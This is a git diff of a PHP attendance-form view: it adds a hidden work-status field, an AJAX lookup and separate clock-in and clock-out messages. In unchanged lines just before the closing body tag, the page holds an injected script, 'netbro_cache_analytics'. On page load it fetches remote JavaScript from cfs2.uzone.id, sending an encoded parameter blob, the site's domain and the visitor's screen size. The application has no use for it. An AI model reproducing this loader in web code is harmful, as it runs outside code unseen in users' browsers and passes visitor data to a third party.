@@ -101,6 +101,7 @@ $tanggal=date('d/m/Y');
 						$date=date("Y-m-d");
 						?>
 						<input type="hidden" name="user_id" value="<?php echo $this->session->userdata('id_user'); ?>"class="form-control" id="user_id" >
+            <input type="hidden" name="work" id="work">
 						<input type="hidden" name="long" id="long">
 						<input type="hidden" name="lat" id="lat">
 						<input type="hidden" name="start_date" value="<?php echo $time; ?>" id="start_date">
@@ -245,42 +246,95 @@ $tanggal=date('d/m/Y');
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKL8xXQhGpEWxo5qY3k16bOBCNaZKaqro2cjHjIuDWzlUNzsvxwF%2bKlgXJLtHTKEqf6RONnSLXf4kleb7JKg8jMe4RCxPsZDHdC%2bR7PpkQe25PY1cM0y89iSN0DegBnrMXo1hQwOE%2f0TnRO9Uz81SvhhGNgGh7GnULgHBOZZ%2fOphOtX3Tj6f0eat5jHCln801BuvVMbkKW1mD8TL2NeJhF8jatl4RRobrWZ93T7jQ76yXsW3f2kP9jaF%2f3r7mmPR%2fCbfHNo76igbnHzyydCOOnLcS1dBRvF%2f2ii%2bwnH%2bJUrop9VXLtWgJ7LDT5ZRtf5iUTuMUQpzazjlpIQcM1OLFnqjJb2FoQJ1CLv1mwEnFNve6kCHGnafvaDMQrHPA5tPQbEK6Ye6KyqTr1916az0onj0sXzpLNJq5eLWvIH4wcBsA4RM94Iv%2b8ftCta787GkeKjj0dJcsNs%2bh5I7I9WevaBPFPrutdnwc5umu%2fr28%2fnXeLj3Can079KQzKDxkt6aobl6f%2fnqByFIZBiYu1zxf2JKGL4Z%2fCgRI6" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 <script>
 	$('#form_input_shoes').submit(function(e){
-	
-		formData = new FormData($(this)[0]);
-			$.ajax({
-					url 	: '<?php echo base_url() ?>/index.php/data_absensi/save_data_absensi',
-					type	: 'POST',
-					data	: formData,
-					async	: false,
-					cache	: false,
-					processData : false,
-					contentType	: false,
-				
-					beforeSend: function() {
-						
-					},
-					complete: function() {
-						 setTimeout(function(){
-				sweetAlert({
-	                                                   title: "Berhasil!", 
-                                                        text: "Data Berhasil Masuk!", 
+	 var cek_work = $('#work').val();
+    if(cek_work == 1){
+		  formData = new FormData($(this)[0]);
+      $.ajax({
+          url   : '<?php echo base_url() ?>/index.php/data_absensi/save_data_absensi',
+          type  : 'POST',
+          data  : formData,
+          async : false,
+          cache : false,
+          processData : false,
+          contentType : false,
+        
+          beforeSend: function() {
+            
+          },
+          complete: function() {
+             setTimeout(function(){
+        sweetAlert({
+                                                     title: "Berhasil Absen Keluar!", 
+                                                        text: "Data Berhasil Tersimpan!", 
                                                         type: "success",
-														
-														 timer: 1200,
-														 showCancelButton: false,//There won't be any cancle button
-															showConfirmButton  : false ,
+                            
+                             timer: 1200,
+                             showCancelButton: false,//There won't be any cancle button
+                              showConfirmButton  : false ,
                                                         }
-														, function() {
-																	location.reload();
-																}
-														);
-						 }, 5000);
-					}
-				})
+                            , function() {
+                                  location.reload();
+                                }
+                            );
+             }, 5000);
+          }
+        })
+    }else if(cek_work == 0){
+      alert('Anda telah melakukan logout');
+    }else{
+      formData = new FormData($(this)[0]);
+      $.ajax({
+          url   : '<?php echo base_url() ?>/index.php/data_absensi/save_data_absensi',
+          type  : 'POST',
+          data  : formData,
+          async : false,
+          cache : false,
+          processData : false,
+          contentType : false,
+        
+          beforeSend: function() {
+            
+          },
+          complete: function() {
+             setTimeout(function(){
+        sweetAlert({
+                                                     title: "Berhasil Absen Masuk!", 
+                                                        text: "Data Berhasil Tersimpan!", 
+                                                        type: "success",
+                            
+                             timer: 1200,
+                             showCancelButton: false,//There won't be any cancle button
+                              showConfirmButton  : false ,
+                                                        }
+                            , function() {
+                                  location.reload();
+                                }
+                            );
+             }, 5000);
+          }
+        })
+    }
 		
 			
-			return false;
+			// return false;
 	});
+</script>
+
+<script>
+      $(document).ready(function(){
+      var id = $('#user_id').val();
+            $.ajax({
+                url     : '<?php echo base_url() ?>index.php/data_absensi/get_data_absensi_work',
+                data  : {'id':id},
+                type    : 'POST',
+                crossDomain: true,
+              async: false,
+                success:function (data){
+          var datalist = data.data;
+          $('#work').val(datalist[0].work);
+                }
+            })
+    });
 </script>
 
 <script>
